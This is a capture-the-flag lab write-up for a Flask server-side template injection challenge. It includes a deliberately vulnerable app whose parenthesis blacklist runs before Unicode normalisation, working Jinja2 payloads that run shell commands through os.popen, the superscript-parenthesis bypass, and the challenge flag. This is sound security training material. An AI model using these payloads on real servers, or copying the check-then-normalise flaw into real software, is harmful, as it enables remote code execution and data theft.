# SSTI-Easy 3

### Difficulty: Easy

### Objective: Bypass blacklisted ("(" and ")")

## Setting Up

Ensures that `Docker` is installed into your machine as this challenge requires Docker. If you're unsure how to do it, you can refer [here](https://www.kali.org/docs/containers/installing-docker-on-kali/) to install it into your Kali machine. Then, install the files `app.py` , `Dockerfile` and `flag-ae1fc7fb8d35721c7d5cd95b5e854349.txt` into the same directory.

### Commands (Kali)
[1] `sudo docker build -t sstichall .`

[2] `sudo docker run -d sstichall`

[3] `sudo docker logs <The container id>`

Use the first IP provided by the command [3] to access the challenge as highlighted below.

![image](https://github.com/user-attachments/assets/a2dc8099-2cb9-42d9-a8d2-c34d04b245e8)

Challenge should look like this and you are ready to go!

![image](https://github.com/user-attachments/assets/71d4d057-c35f-4c21-b28f-efaa2f35bff9)

## Solution 
<details>
  
The challenge starts with a text box and allows user input. Then, we starts with the a simple text "hello world" and observe its response.

![image](https://github.com/user-attachments/assets/8c6da092-9fc2-4a3b-9054-d900ca44c47d)

The website seems to return our text back as a response. 

![image](https://github.com/user-attachments/assets/03732c9a-86e7-4042-9ea6-9877e978db85)

Let's try using a simple SSTI payload `{{7*7}}` and observe its behaviour.

![image](https://github.com/user-attachments/assets/d853ed2f-3c60-48bd-880a-be6fa23756ca)

The website returns `49`! That means it is vulnerable to SSTI.

![image](https://github.com/user-attachments/assets/26b6ae54-1bfe-4884-9df2-66fe944dbcea)

Let's use a SSTI payload like `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}` to list down files in the directory!

![image](https://github.com/user-attachments/assets/579ab938-dac5-4d4a-8aed-3edd8ad37819)

The website somehow is blocking our payload. Looks like they blacklisted some characters.

![image](https://github.com/user-attachments/assets/01fb2f5e-312b-48a1-b6b6-ffc1ceec65d7)

Let's analyze the source code and figure out what character did the website blacklisted.

### Source Code (python)
```python

from flask import Flask, request, render_template_string
import re
import unicodedata

app = Flask(__name__)

blacklisted = [r"\(", r"\)"]

@app.route('/', methods=('GET', 'POST'))
def index():
    try:
        if request.method == 'POST':
            note = request.form['note']
            if sanitize(note):
                normalized_note = normalize_input(note)
                return render_template_string(normalized_note)
            else:
                return 'Please provide valid text'
        return '''
            <form method="POST">
                Note: <input type="text" name="note">
                <input type="submit" value="Submit">
            </form>
        '''
    except:
        return 'Please provide valid text'

def sanitize(input_text):
    for pattern in blacklisted:
        if re.search(pattern, input_text):
            return False
    return True

def normalize_input(input_text):
    return unicodedata.normalize('NFKC', input_text)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)

```

The website is confirmed to be vulnerable to SSTI (Jinja 2) as the source code contains the function `render_template_string`. However, there is a function that seems to be preventing us from reaching the vulnerable function which is the `sanitize()`. It will return boolean `False` when it detected the strings contains parenthesis which can prevent a regular SSTI payload. We can use another SSTI payload to bypass this sanitization by using [Unicode Normalization](https://book.hacktricks.xyz/pentesting-web/unicode-injection/unicode-normalization) technique. We can use another character equivalance of Left Parenthesis `U+0028` to Superscript Left Parenthesis `U+207D` and replace the Right Parenthesis `U+0029` to Superscript Right Parenthesis `U+207E`. The payload should look like this:

`{{request.application.__globals__.__builtins__.__import__⁽'os'⁾.popen⁽'ls'⁾.read⁽⁾}}`

Let's use this payload to list down the directories and see what happens.

![image](https://github.com/user-attachments/assets/cb17cb2d-0551-40a3-8f1f-f35957eb309d)

Looks like the payload works! We successfully view all the files contain inside the server directory. Let's try viewing the flag text file by using `cat` command:

`{{request.application.__globals__.__builtins__.__import__⁽'os'⁾.popen⁽'cat flag-ae1fc7fb8d35721c7d5cd95b5e854349.txt '⁾.read⁽⁾}}`

![image](https://github.com/user-attachments/assets/f7615ec3-3f49-4a86-a428-ab030c2fd2d0)

Thus, we have successfully obtained the flag.

## Flag
>flag{74c3377cca2f042c5819014f00cb4006} 

</details>
